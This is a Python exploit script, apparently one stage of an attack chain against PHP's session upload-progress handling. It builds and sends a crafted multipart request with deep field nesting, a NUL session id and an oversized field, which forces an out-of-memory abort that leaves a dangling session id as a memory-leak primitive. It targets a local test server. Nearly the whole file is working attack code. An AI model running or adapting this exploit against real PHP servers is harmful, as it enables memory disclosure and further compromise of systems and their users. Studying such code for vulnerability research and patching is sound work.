#!/usr/bin/env python3
"""Request A variant for the send_cookie leak prime.

Order:
  1) warning field (deep nesting)  -> makes SG(headers_sent)=1 pre-RINIT
  2) PHPSESSID = b"\x00"           -> PS(id) becomes an "empty" string
  3) PHP_SESSION_UPLOAD_PROGRESS
  4) file part                     -> FILE_START -> session_initialize:
                                      empty id -> create new id, send_cookie=1
                                      reset_id -> send fails (headers sent)
                                      -> send_cookie stays 1; initialize aborts
  5) huge field                    -> OOM; PS.id dangles, send_cookie=1

usage: send_a_leak.py NEST HUGE_MB
"""
import socket, sys
NEST=int(sys.argv[1]) if len(sys.argv)>1 else 1100
HUGE=int(sys.argv[2]) if len(sys.argv)>2 else 12
BND=b'S'*17
name=('a'+'[a]'*NEST).encode()
parts=[]
parts.append({'name':name,'data':b'x'})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    nm = p['name'] if isinstance(p['name'], bytes) else p['name'].encode()
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+nm+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+nm+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+body)
except OSError: pass
data=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError: pass
s.close()
print(data.split(b'\r\n\r\n',1)[-1][:300].decode('latin1','replace'))
